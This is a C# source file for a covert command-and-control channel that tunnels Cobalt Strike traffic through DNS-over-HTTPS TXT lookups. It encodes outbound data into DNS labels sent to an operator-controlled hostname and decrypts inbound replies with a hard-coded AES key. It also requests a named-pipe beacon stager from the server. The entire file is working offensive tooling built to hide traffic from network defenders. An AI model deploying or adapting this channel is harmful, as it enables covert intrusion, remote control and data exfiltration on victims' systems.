using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using ExternalC2.Interfaces;
using System.IO;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Security.Cryptography;

namespace ExternalC2.Channels
{
    class DoHChannel : IC2Channel
    {
        static byte[] decrypt(byte[] cipherText)
        {
            try
            {
                if (cipherText == null || cipherText.Length <= 0)
                    throw new ArgumentNullException("cipherText");

                byte[] outputBytes;

                using (Aes aesAlg = Aes.Create())
                {
                    aesAlg.Mode = CipherMode.CBC;
                    aesAlg.Padding = PaddingMode.None;

                    // Change the below Key and IV
                    byte[] key = Convert.FromBase64String("hRUuLu7B61rgSWd/kQEGFjK7367/9gn+Mucl6eHCnHw=");
                    byte[] iv = Convert.FromBase64String("LpriMy1kPv1G1HYkO0kmHQ==");

                    aesAlg.Key = key;
                    aesAlg.IV = iv;

                    ICryptoTransform decryptor = aesAlg.CreateDecryptor(key, iv);

                    using (var memoryStream = new MemoryStream())
                    {
                        using (var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                        {
                            cryptoStream.Write(cipherText, 0, cipherText.Length);
                            cryptoStream.FlushFinalBlock();
                            outputBytes = memoryStream.ToArray();
                        }
                    }

                }
                return outputBytes;
            }
            catch
            {
                return new byte[] { 0x00 };
            }
        }


        public List<string> getTxtRecords(string hostname)
        {
            List<string> txtResponses = new List<string>();

            string url = String.Format("{0}?name={1}&type=TXT", dohResolver, hostname);

            Console.WriteLine("[URL] {0}", url);

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls| SecurityProtocolType.Tls11| SecurityProtocolType.Tls12| SecurityProtocolType.Ssl3;
            
            using (WebClient wc = new WebClient())
            {
                wc.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                wc.Headers.Add("Accept", "application/dns-json");
                var json = wc.DownloadString(url);

                try
                {
                    JObject result = JObject.Parse(json);
                    for(int i = 0; i < result["Answer"].Count(); i++)
                    {
                        string data = (string)result["Answer"][i]["data"];
                        txtResponses.Add(data.Replace("\"", ""));
                        Console.WriteLine("[TXT] {0}", data.Replace("\"", ""));
                    }
                }
                catch
                {
                    txtResponses.Add("");
                }
            }
            System.Threading.Thread.Sleep(100);
            return txtResponses;
        }

        private const int MaxBufferSize = 1024 * 1024;
        private readonly IPEndPoint _endpoint;

        public bool Connected => true;


        public bool Connect()
        {
            System.Threading.Thread.Sleep(1000);
            return true;
        }

        public void Close()
        {
        }

        public void Dispose()
        {
        }

        private Random random = new Random();
        private string sendHostname;
        private string receiveHostname;
        private string dohResolver;
        private string dohSocketHandle;

        public DoHChannel(string send, string receive, string resolver)
        {
            sendHostname = send;
            receiveHostname = receive;
            dohResolver = resolver;
            dohSocketHandle = RandomString(4);
            string newSocket = String.Format("{0}.{1}", dohSocketHandle, sendHostname);
            getTxtRecords(newSocket);
        }

        public string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray()).ToLower();
        }

        static IEnumerable<string> ChunksUpto(string str, int maxChunkSize)
        {
            for (int i = 0; i < str.Length; i += maxChunkSize)
                yield return str.Substring(i, Math.Min(maxChunkSize, str.Length - i));
        }

        public void SendDoH(byte[] buffer)
        {
            int charsPerLabel = 50;
            int labelsPerLookup = 3;
            string session = RandomString(4);

            var encoded = Base32.Encode(buffer).ToLower();
            var chunks = ChunksUpto(encoded, charsPerLabel);

            List<string> lookupQueue = new List<string>();
            List<string> labels = new List<string>();
            string lookup = "";
            int pos = 0;
            foreach (string chunk in chunks)
            {
                labels.Add(chunk);

                if (labels.Count == labelsPerLookup)
                {
                    lookup = String.Format("{0}.{1}.{2}.{3}.{4}", dohSocketHandle, pos, session, String.Join(".", labels.ToArray()), sendHostname);
                    lookupQueue.Add(lookup);
                    pos += 1;
                    labels = new List<string>();
                }
            }
            if (labels.Count > 0)
            {
                lookup = String.Format("{0}.{1}.{2}.{3}.{4}", dohSocketHandle, pos, session, String.Join(".", labels.ToArray()), sendHostname);
                lookupQueue.Add(lookup);
            }

            int entries = lookupQueue.Count();
            lookup = String.Format("{0}.{1}.{2}.{3}", dohSocketHandle, entries, session, sendHostname);
            lookupQueue.Insert(0, lookup);


            foreach (string l in lookupQueue)
            {
                getTxtRecords(l);
            }
        }

        public void SendFrame(byte[] buffer)
        {
            SendDoH(buffer);
        }

        public byte[] ReadFrame()
        {
            try
            {
                string session = RandomString(4);

                string probe = String.Format("{0}.{1}.{2}", dohSocketHandle, session, receiveHostname);
                getTxtRecords(probe);

                System.Threading.Thread.Sleep(2000);


                int pos = 0;
                int limit = 1500;
                bool eof = false;
                string data = "";
                while (!eof && (pos < limit))
                {
                    string lookup = String.Format("{0}.{1}.{2}.{3}", dohSocketHandle, pos, session, receiveHostname);
                    List<string> responses = getTxtRecords(lookup);

                    foreach (string r in responses)
                    {
                        if (r.Contains("EOFEOFEOFEOF"))
                        {
                            eof = true;
                            break;
                        }
                        data += r;
                        pos += 1;
                    }
                }
                byte[] buffer = decrypt(Convert.FromBase64String(data));
                return buffer;
            }
            catch (Exception ex)
            {
                //Console.WriteLine($"Exception while reading socket: {ex.Message}");
                return new byte[] { 0x00 };
            }
        }
        /// <summary>
        ///     Read a frame from the socket and send it to the beacon channel
        /// </summary>
        /// <param name="c2"></param>
        /// <returns></returns>
        public bool ReadAndSendTo(IC2Channel c2)
        {
            var buffer = ReadFrame();
            //if (buffer.Length <= 0) return false;
            c2.SendFrame(buffer);

            return true;
        }

        /// <summary>
        ///     Requests an NamedPipe beacon from the Cobalt Strike server
        /// </summary>
        /// <param name="pipeName"></param>
        /// <param name="is64Bit"></param>
        /// <param name="taskWaitTime"></param>
        /// <returns>The stager bytes</returns>
        public byte[] GetStager(string pipeName, bool is64Bit, int taskWaitTime = 100)
        {
            SendFrame(Encoding.ASCII.GetBytes(is64Bit ? "arch=x64" : "arch=x86"));
            SendFrame(Encoding.ASCII.GetBytes("pipename=" + pipeName));
            SendFrame(Encoding.ASCII.GetBytes("block=" + taskWaitTime));
            SendFrame(Encoding.ASCII.GetBytes("go"));

            return ReadFrame();
        }
    }
}
